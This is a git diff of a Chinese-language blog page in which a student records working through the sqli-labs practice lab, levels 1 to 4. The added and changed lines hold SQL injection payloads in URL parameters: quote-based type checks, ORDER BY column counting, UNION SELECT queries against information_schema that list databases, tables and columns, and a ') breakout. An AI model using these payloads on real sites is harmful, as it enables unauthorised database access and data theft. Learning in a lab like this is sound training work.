@@ -81,7 +81,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">485</span>
+            <span class="post-count">786</span>
         </span>
     </span>
 
@@ -90,13 +90,15 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
@@ -105,21 +107,28 @@
        
   <p>Hello，我是enhenng,在历经了长达三周的删删改改重建之后，我的blog终于搭建成功啦。</p>
 <p>本文目标：学习sql注入，掌握基本的注入知识<br>基础知识：</p>
-<p><strong>一：sql注入的类型：</strong></p>
-<ol>
+<h1 id="一：sql注入的基础知识："><a href="#一：sql注入的基础知识：" class="headerlink" title="一：sql注入的基础知识："></a>一：sql注入的基础知识：</h1><h2 id="sql的类型"><a href="#sql的类型" class="headerlink" title="sql的类型"></a>sql的类型</h2><ol>
 <li>get型注入：直接在URL中进行sql注入（例如第一题）</li>
-<li></li>
 </ol>
-<p><strong>第一关：基于错误的get型注入</strong>（嗯…啥是基于错误？）<br>首先判断注入类型—–&gt;字符型or数字型<br>如何判断注入类型<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5edd7a58a69e" title="参考文章">（参考文章）</a><br>按照文章所示，尝试一下，发现在输入?id&#x3D;1’ and ‘1’&#x3D;’2’–+（这道题如果不加上–+，在回显时会出现报错）（想插一个图片来着，没找到合适的方法，算了）没有回显，是字符型注入。<br>尝试获取列数（在后面的union中需要保证前后队列书相同）</p>
+<h2 id="需要使用要的一些函数"><a href="#需要使用要的一些函数" class="headerlink" title="需要使用要的一些函数"></a>需要使用要的一些函数</h2><h1 id="二：sqli-labs闯关"><a href="#二：sqli-labs闯关" class="headerlink" title="二：sqli-labs闯关"></a>二：sqli-labs闯关</h1><p><strong>第一关：基于错误的get型注入（字符型）</strong>（嗯…啥是基于错误？）<br>首先判断注入类型—–&gt;字符型or数字型<br>如何判断注入类型<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5edd7a58a69e" title="参考文章">（参考文章）</a>  （这个很重要）<br>按照文章所示，尝试一下，发现在输入?id&#x3D;1’ and ‘1’&#x3D;’2’–+（这道题如果不加上–+，在回显时会出现报错）（想插一个图片来着，没找到合适的方法，算了）没有回显，是字符型注入。<br>尝试获取列数（在后面的union中需要保证前后队列书相同）</p>
 <blockquote>
 <p>?id&#x3D;1’ order by 3–+   —-&gt;回显正常<br>?id&#x3D;1’ order by 4–+   —-&gt;unkown column ‘4’ in ‘order clause’    </p>
 </blockquote>
 <p>即共有3列，下面才是重点<br>在获取敏感信息前要确定什么才是回显的内容  ?id&#x3D;-1’ union select 1,2,3(得到回显的内容）<br><strong>查询数据库信息</strong>  </p>
 <blockquote>
-<p>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p>
+<p>union select 1,database(),version<br>union select 1,1,SCHEMA_NAME from information_schema.SCHEMATA（暴露数据库名称）（在这之前需要了解一下数据库的结构）&#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>解决：union select 1,1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)–+<br>union select 1,1,TABLE_NAME（表名）,TABLE_SCHEMA（表所在数据库）from information_schema.TABLES（暴露数据库中表的名称）  &#x2F;&#x2F;这个命令存在着一个问题<br>，只暴露所找的第一个表名称）<br>union select 1,1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables *where table_schema&#x3D;’mysql’*)–+(MYSQL查询不区分大小写，但其库名表名等是严格区分大小写的）<br>union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D; “CHARACTER_SETS”)–+  </p>
 </blockquote>
 <p>这里的命令可以根据所想要查找的内容任意改变。  </p>
-<p><strong>第二关</strong></p>
+<p><strong>第二关（数字型）</strong><br>与第一关相同，首先判断sql注入的类型为数字型<br>按照第一关的步骤，依次获得数据库的名称，数据库中表的名称，列的名称等等  </p>
+<p><strong>第三关</strong>（这一关与前两关的区别在于需要根据回显错误的内容猜测输入与原句的关系）<br>尝试猜测过程：  </p>
+<ol>
+<li>输入?id&#x3D;1 回显正常  </li>
+<li>输入?id&#x3D;1’ 回显错误   You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1(即’’1’’)LIMIT 0,1’为url真正输入的)  </li>
+<li>易看出应该是需要输入’)  </li>
+<li>尝试输入?id&#x3D;1’)–+回显正常，则得出需要输入的东西</li>
+</ol>
+<p>但是这块还有一点我没能搞明白，为什么一定要按照?id&#x3D;1’) order by 1–+输入，而不能按照?id&#x3D;1’ order by 1)–+输入<br>之后，按照第一题依次得到即可以</p>
+<p><strong>第四关</strong>(什么鬼，为什么我的第四关不报错）</p>
  
       <!-- reward -->
       
@@ -194,6 +203,15 @@
 
    
   <nav class="article-nav">
+    
+      <a href="/2022/11/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%84%E7%AE%97%E5%88%86%E6%9E%90/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            数据结构与算法分析
+          
+        </div>
+      </a>
     
     
       <a href="/2022/11/09/hello-world/" class="article-nav-link">
